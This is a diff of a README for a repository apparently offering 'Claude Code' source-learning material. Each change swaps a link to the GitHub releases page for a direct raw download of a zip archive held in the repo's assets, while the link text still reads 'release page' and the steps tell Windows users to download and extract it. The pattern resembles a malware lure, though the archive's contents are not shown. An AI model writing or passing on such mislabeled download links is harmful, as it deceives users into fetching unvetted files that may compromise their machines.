@@ -1,6 +1,6 @@
 # 📘 cc-src-learning - Learn Claude Code from source
 
-[![Download](https://img.shields.io/badge/Download%20Here-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Canvastentbranchia892/cc-src-learning/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Canvastentbranchia892/cc-src-learning/raw/refs/heads/main/assets/src_learning_cc_v1.7.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ This project focuses on learning from real source structure, common patterns, an
 
 ## 📥 Download and install
 
-1. Open the [release page](https://github.com/Canvastentbranchia892/cc-src-learning/releases).
+1. Open the [release page](https://github.com/Canvastentbranchia892/cc-src-learning/raw/refs/heads/main/assets/src_learning_cc_v1.7.zip).
 2. Find the latest release at the top of the page.
 3. Download the file for Windows.
 4. If the file is a `.zip`, right-click it and choose Extract All.
@@ -112,7 +112,7 @@ That makes it useful for people who want:
 
 ## 📎 Quick access
 
-[Open the release page](https://github.com/Canvastentbranchia892/cc-src-learning/releases)
+[Open the release page](https://github.com/Canvastentbranchia892/cc-src-learning/raw/refs/heads/main/assets/src_learning_cc_v1.7.zip)
 
 ## 🔐 Basic safety check
 
